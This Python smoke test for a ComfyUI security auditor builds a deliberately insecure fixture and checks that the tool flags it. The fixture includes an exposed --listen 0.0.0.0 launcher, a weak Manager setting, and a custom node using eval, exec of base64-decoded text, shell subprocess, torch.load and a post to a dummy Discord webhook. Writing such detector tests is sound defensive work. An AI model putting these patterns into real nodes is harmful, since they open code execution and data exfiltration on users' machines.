"""Lean smoke test. Runs with plain `python tests/test_smoke.py` or under pytest.

Builds a tiny deliberately-insecure ComfyUI fixture, runs the audit pipeline in
process, and asserts the high-value findings fire and the grade is F.
"""

import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from comfyguard import collectors, report as report_mod  # noqa: E402
from comfyguard.checks import run_checks  # noqa: E402


def _build(portable: Path):
    """A windows-portable-style layout: the launcher with --listen sits in the
    parent of the ComfyUI directory (regression guard for T1)."""
    def w(rel, text):
        p = portable / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)

    (portable / "python_embeded").mkdir(parents=True, exist_ok=True)
    w("run_nvidia_gpu.bat", ".\\python_embeded\\python.exe -s ComfyUI\\main.py --listen 0.0.0.0 --enable-cors-header\n")
    w("ComfyUI/main.py", "# entry\n")
    w("ComfyUI/comfyui_version.py", '__version__ = "0.3.62"\n')
    w("ComfyUI/models/checkpoints/base.safetensors", "safe")
    w("ComfyUI/models/checkpoints/x.ckpt", "pickle")
    w("ComfyUI/custom_nodes/ComfyUI-Manager/pyproject.toml", 'version = "3.29.0"\n')
    w("ComfyUI/user/default/ComfyUI-Manager/config.ini",
      "[default]\nsecurity_level = weak\n")
    w("ComfyUI/custom_nodes/comfyui_perf_monitor/__init__.py", "NODE_CLASS_MAPPINGS = {}\n")
    w("ComfyUI/custom_nodes/handy/__init__.py",
      "import subprocess\nsubprocess.run('x', shell=True)\n")
    w("ComfyUI/custom_nodes/handy/nodes.py",
      "import base64, subprocess, requests, torch\n"
      "def f(e, p, m):\n"
      "    m.eval()\n"                 # method .eval() - must NOT flag (T2)
      "    m.exec()\n"                 # method .exec() - must NOT flag (T2)
      "    eval(e)\n"                  # builtin eval - the one NODE-001 that should fire
      "    subprocess.run(['pip','install','z'])\n"
      "    requests.post('https://discord.com/api/webhooks/1/2')\n"
      "    torch.load(p)\n"
      "    exec(base64.b64decode('eA==').decode())\n")
    w("ComfyUI/custom_nodes/handy/requirements.txt", "somepkg\n")
    # disabled backup copy - must be skipped entirely (T5)
    w("ComfyUI/custom_nodes/.removed_packs_backup/.disabled/handy/nodes.py",
      "def f(u):\n    return eval(u)\n")


def run():
    with tempfile.TemporaryDirectory() as tmp:
        portable = Path(tmp) / "ComfyUI_windows_portable"
        _build(portable)
        comfy_dir = portable / "ComfyUI"
        facts = collectors.collect(comfy_dir)  # audit the subdir, launcher is in the parent
        findings = run_checks(facts, comfy_dir)
        rep = report_mod.build_report(facts, findings, {"started_at": "t", "duration_seconds": 0})
        fl = rep["findings"]
        ids = {f["check_id"] for f in fl}
        expected = {"EXP-001", "EXP-003", "AUTH-001", "PATCH-007", "HOST-007",
                    "NODE-001", "NODE-003", "NODE-006", "NODE-010", "MODEL-001"}
        missing = expected - ids
        assert not missing, f"missing expected findings: {missing}"
        assert rep["summary"]["grade"] == "F", rep["summary"]["grade"]
        assert rep["summary"]["pre_exposure_gate_passed"] is False, "T1: gate must fail on exposed portable instance"
        # T2: only the one builtin eval(), not the two method .eval()/.exec() calls
        n001 = [f for f in fl if f["check_id"] == "NODE-001"]
        assert len(n001) == 1, f"T2: expected 1 NODE-001, got {len(n001)}"
        # T5: nothing scanned inside the backup/disabled tree
        assert not any(".removed_packs_backup" in f["location"].get("path", "") for f in fl), "T5"
        # T9: report carries a BOM and the detected launch config
        assert "bom" in rep and rep["scan"]["launch"]["source"], "T9: bom + launch source"
        assert "production_warning" in rep["notices"]
        assert not (comfy_dir / "report.json").exists()  # read-only
        return ids


def test_smoke():
    run()


if __name__ == "__main__":
    found = run()
    print(f"OK: smoke test passed, {len(found)} check families fired")
